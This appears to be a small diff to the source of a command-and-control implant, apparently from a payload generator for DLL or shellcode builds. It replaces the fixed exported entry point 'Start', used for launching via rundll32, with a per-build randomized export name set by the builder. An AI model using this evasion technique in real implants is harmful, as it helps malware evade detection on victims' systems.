@@ -2,10 +2,13 @@
 
 #include <common/Defines.h>
 
+#ifndef EXPORT_FUNC_NAME
+#define EXPORT_FUNC_NAME Start
+#endif
+
 #ifndef SHELLCODE
-/* Export this for rundll32 or any other program that requires and exported functions...
- * TODO: make this function name optional/changeable in the payload generator.*/
-DLLEXPORT VOID Start(  )
+/* Export name randomized per build via EXPORT_FUNC_NAME (set by the builder). */
+DLLEXPORT VOID EXPORT_FUNC_NAME(  )
 {
     /* prevent exiting if started using rundll32 or something */
     PVOID Kernel32  = LdrModulePeb( H_MODULE_KERNEL32 );
